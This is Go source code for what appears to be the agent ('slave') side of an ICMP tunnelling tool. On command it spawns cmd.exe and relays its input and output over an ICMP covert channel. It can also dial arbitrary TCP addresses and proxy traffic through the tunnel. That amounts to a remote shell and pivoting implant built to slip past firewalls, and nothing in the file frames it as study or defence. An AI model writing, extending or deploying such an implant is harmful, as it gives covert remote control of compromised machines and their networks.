package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"time"

	"context"

	"protocol/icmp/internal/app"
	"protocol/icmp/internal/protocol"
	"protocol/icmp/internal/shell"
	"protocol/icmp/internal/stdio"
	"protocol/icmp/internal/transport"
	"protocol/icmp/internal/tunnel"

	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

const (
	DefaultDelay       = 200
	DefaultTimeout     = 3000
	DefaultMaxBlanks   = 10
	DefaultMaxDataSize = 64
)

type slaveConfig struct {
	target      string
	isTest      bool
	delay       int
	timeout     int
	maxBlanks   int
	maxDataSize int
}

var buildSlaveRuntime = func(cfg slaveConfig) (serviceRunner, io.Closer, error) {
	executor, err := shell.NewCmdShell(cfg.maxDataSize)
	if err != nil {
		return nil, nil, fmt.Errorf("create shell error: %w", err)
	}

	tunnelManager := tunnel.NewTunnelManager()
	tunnelManager.OnSYN = func(conn net.Conn, payload []byte) {
		if len(payload) == 0 {
			conn.Close()
			return
		}
		cmd := payload[0]
		switch cmd {
		case protocol.CmdShell:
			c := exec.Command("cmd.exe")
			stdinPipe, err := c.StdinPipe()
			if err != nil {
				conn.Close()
				return
			}
			stdoutPipe, err1 := c.StdoutPipe()
			stderrPipe, err2 := c.StderrPipe()
			if err1 != nil || err2 != nil {
				stdinPipe.Close()
				conn.Close()
				return
			}
			if err := c.Start(); err != nil {
				stdinPipe.Close()
				conn.Close()
				return
			}

			// Decode GBK output from cmd.exe to UTF-8 before sending to conn
			stdoutDecoder := transform.NewReader(stdoutPipe, simplifiedchinese.GB18030.NewDecoder())
			stderrDecoder := transform.NewReader(stderrPipe, simplifiedchinese.GB18030.NewDecoder())
			go pumpStream(stdoutDecoder, conn)
			go pumpStream(stderrDecoder, conn)

			// Encode UTF-8 input from conn to GBK before writing to cmd.exe stdin
			stdinEncoder := transform.NewWriter(stdinPipe, simplifiedchinese.GB18030.NewEncoder())
			go func() {
				_, _ = io.Copy(stdinEncoder, conn)
				stdinPipe.Close()
			}()

			go func() {
				_ = c.Wait()
				conn.Close()
			}()
		case protocol.CmdTCPDial:
			// Dial target TCP address
			target := string(payload[1:])
			tcpConn, err := net.Dial("tcp", target)
			if err != nil {
				conn.Close()
				return
			}
			go func() {
				_, _ = io.Copy(conn, tcpConn)
				conn.Close()
			}()
			go func() {
				_, _ = io.Copy(tcpConn, conn)
				tcpConn.Close()
			}()
		default:
			conn.Close()
		}
	}

	service := app.SlaveService{
		Config: app.SlaveConfig{
			Delay:    time.Duration(cfg.delay) * time.Millisecond,
			Timeout:  time.Duration(cfg.timeout) * time.Millisecond,
			TestMode: cfg.isTest,
			Logger:   stdio.WrapConsoleWriter(os.Stdout),
		},
		Client: transport.PcapPollClient{
			TargetIP: cfg.target,
			Timeout:  time.Duration(cfg.timeout) * time.Millisecond,
			Resolver: transport.OSResolver{},
			ID:       1,
			Seq:      1,
		},
		Executor:      executor,
		TunnelManager: tunnelManager,
	}
	return service, executor, nil
}

// pumpStream reads from r with a small buffer and writes to the tunnel connection.
// The small buffer (256 bytes) forces fine‑grained chunks for near‑real‑time streaming.
func pumpStream(r io.Reader, conn net.Conn) {
    buf := make([]byte, 256)
    for {
        n, err := r.Read(buf)
        if n > 0 {
            if _, werr := conn.Write(buf[:n]); werr != nil {
                return
            }
        }
        if err != nil {
            return
        }
    }
}

func runSlave(cfg slaveConfig) error {
	fmt.Printf("启动配置 -> Target: %s, Delay: %d, TestMode: %v\n", cfg.target, cfg.delay, cfg.isTest)
	service, closer, err := buildSlaveRuntime(cfg)
	if err != nil {
		return err
	}
	if closer != nil {
		defer closer.Close()
	}
	return service.Run(context.Background())
}
